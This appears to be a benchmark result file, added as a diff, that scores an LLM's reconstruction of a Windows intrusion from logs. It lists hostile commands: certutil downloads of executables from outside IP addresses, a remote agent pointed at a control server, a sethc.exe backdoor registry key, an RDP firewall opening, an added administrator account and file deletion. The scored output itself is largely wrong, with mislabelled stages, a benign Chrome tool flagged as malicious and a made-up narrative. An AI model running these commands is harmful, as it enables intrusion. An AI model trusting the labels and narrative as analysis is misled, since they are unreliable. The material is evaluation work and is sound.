@@ -1,0 +1,172 @@
+{
+  "output": {
+    "malicious_events": [
+      {
+        "command": "software_reporter_tool.exe",
+        "stage": "Execution"
+      },
+      {
+        "command": "software_reporter_tool.exe --engine=2 --scan-locations=1,2,3,4,5,6,7,8,10 --disabled-locations=9,11 --session-id=YzNf24YYZfuvRHVbjuMFf3GpplnJ+CDak8V6SAZz --registry-suffix=ESET --enable-crash-reporting --srt-field-trial-group-name=NewCleanerUIExperiment",
+        "stage": "Credential Access"
+      },
+      {
+        "command": "wrote -> C:\\Users\\ADMINI~1\\AppData\\Local\\Temp\\2\\5376_1853232701\\software_reporter_tool.exe",
+        "stage": "Execution"
+      },
+      {
+        "command": "certutil -urlcache -split -f http://124.223.85.207:8079/sangforcat.exe C:\\Users\\Public\\agent.exe",
+        "stage": "Command and Control"
+      },
+      {
+        "command": "taskkill /f /im agent.exe",
+        "stage": "Defense Evasion"
+      },
+      {
+        "command": "certutil -urlcache -split -f http://124.223.085.207:8079/sangforcat.exe C:\\Users\\Public\\agent.exe",
+        "stage": "Credential Access"
+      },
+      {
+        "command": "start /min C:\\Users\\Public\\agent.exe -opid 7fa51253-c053-4b44-94eb-5d8a161b429b -server https://124.223.85.207:8443",
+        "stage": "Lateral Movement"
+      },
+      {
+        "command": "wrote -> C:\\Users\\Public\\PhpStudyPoc.py",
+        "stage": "Command and Control"
+      },
+      {
+        "command": "wrote -> C:\\Users\\Public\\PhpStudyExp2.py",
+        "stage": "Command and Control"
+      },
+      {
+        "command": "wrote -> C:\\Users\\Public\\WinBrute.exe",
+        "stage": "Command and Control"
+      },
+      {
+        "command": "wrote -> C:\\Users\\Public\\nbtscan.exe",
+        "stage": "Command and Control"
+      },
+      {
+        "command": "wrote -> C:\\Users\\Public\\PAExec.exe",
+        "stage": "Command and Control"
+      },
+      {
+        "command": "PHPStudyPoc.py",
+        "stage": "Execution"
+      },
+      {
+        "command": "Python PhpStudyPoc.py http://121.36.30.176/",
+        "stage": "Command and Control"
+      },
+      {
+        "command": "del /f /q PhpStudyPoc.py",
+        "stage": "Collection"
+      },
+      {
+        "command": "CertUtil.exe -urlcache -split -f http://124.223.085.207:8079/sangforcat.exe C:\\Users\\Public\\agent.exe",
+        "stage": "Command and Control"
+      },
+      {
+        "command": "python PhpStudyExp2.py http://121.36.30.176/ \\",
+        "stage": "Command and Control"
+      },
+      {
+        "command": "Reg Add HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\sethc.exe /v Debugger /t REG_SZ /d C:\\windows\\system32\\cmd.exe /f",
+        "stage": "Privilege Escalation"
+      },
+      {
+        "command": "NetSH AdvFireWall Firewall Add Rule Name Remote Desktop Dir In Action Allow Protocol TCP LocalPort 3389",
+        "stage": "Privilege Escalation"
+      },
+      {
+        "command": "Winbrute.exe Administrator_Password.txt Administrator",
+        "stage": "Credential Access"
+      },
+      {
+        "command": "Cmd.exe /c \"Cd /d D:/phpstudy/www&NET User NBB NB123. /Add & Net Localgroup Administrators NBB/Add Echo [S] & Cd & Echo [E]\" 2>1",
+        "stage": "Credential Access"
+      },
+      {
+        "command": "Certutil.exe -Urlcache -Split -f Http://111.229.170.12/PhpMyAdmin/Themes/Servert.exe C:\\Windows\\YWM.EXE",
+        "stage": "Command and Control"
+      },
+      {
+        "command": "Del /f /q WINBRUTE.EXE",
+        "stage": "Collection"
+      },
+      {
+        "command": "Del /f /q ADMINISTRATOR_PASSWORD.TXT",
+        "stage": "Collection"
+      },
+      {
+        "command": "C:\\Windows\\YWM.EXE",
+        "stage": "Execution"
+      },
+      {
+        "command": "start /Min C:\\Windows\\SVCHOST.EXE",
+        "stage": "Lateral Movement"
+      },
+      {
+        "command": "C:\\Windows\\SVCHOST.EXE",
+        "stage": "Execution"
+      },
+      {
+        "command": "Cmd.exe /C Cmd /C \"Cd /D D:/phptest/WWW & Wmic CPU Get Numberoflogicalprocessors & Echo [S] & Cd & Echo [E]\" 2>1",
+        "stage": "Discovery"
+      },
+      {
+        "command": "FindStr \"Term Service\" Tasklist /Svc",
+        "stage": "Discovery"
+      },
+      {
+        "command": "+ FindStr \"88\" NetStat -AnO",
+        "stage": "Discovery"
+      },
+      {
+        "command": "Cmd.exe /C Cmd /C \"Cd /D D:/Phptest/WWW & Certutil.exe -Urlcache -Split -f Http://111.222.175.61/Pdfeditor/Wechatpdf.exe C:\\Windows\\Pdfreader.EXE & Echo [S] & Cd & Echo [E]\" 2>1",
+        "stage": "Command and Control"
+      },
+      {
+        "command": "PdfReader.exe",
+        "stage": "Execution"
+      }
+    ],
+    "narrative": "A coordinated multi-stage attack occurred across multiple systems on the network. The attackers exploited vulnerabilities in SSL/TLS certificates using Google Chrome to execute arbitrary code. They then downloaded additional tools, such as WinBrute.exe, NBTScan.exe, and PAExec.exe, to escalate their privileges, access sensitive information, and move laterally throughout the network. Additionally, they collected and deleted various files, likely to cover their tracks and maintain persistence. The attackers also manipulated registry keys to disable certain security features and added new users and groups to increase their level of access. Throughout the attacks, the attackers consistently monitored and adjusted their actions to evade detection.",
+    "_parse_ok": true,
+    "_cost": {
+      "llm_calls": 5,
+      "prompt_tokens": 36060,
+      "completion_tokens": 3154,
+      "total_tokens": 39214,
+      "wall_clock_s": 61.529,
+      "parse_retries": 0
+    }
+  },
+  "score": {
+    "event": {
+      "precision": 0.1875,
+      "recall": 0.75,
+      "f1": 0.3,
+      "tp": 6,
+      "fp": 26,
+      "fn": 2
+    },
+    "stage": {
+      "precision": 0.0,
+      "recall": 0.0,
+      "f1": 0.0,
+      "tp": 0,
+      "fp": 32,
+      "fn": 6,
+      "recall_partial": 0.3333333333333333
+    },
+    "hallucination_rate": 0.5666666666666667,
+    "cost": {
+      "llm_calls": 5,
+      "prompt_tokens": 36060,
+      "completion_tokens": 3154,
+      "total_tokens": 39214,
+      "wall_clock_s": 61.529,
+      "parse_retries": 0
+    }
+  }
+}
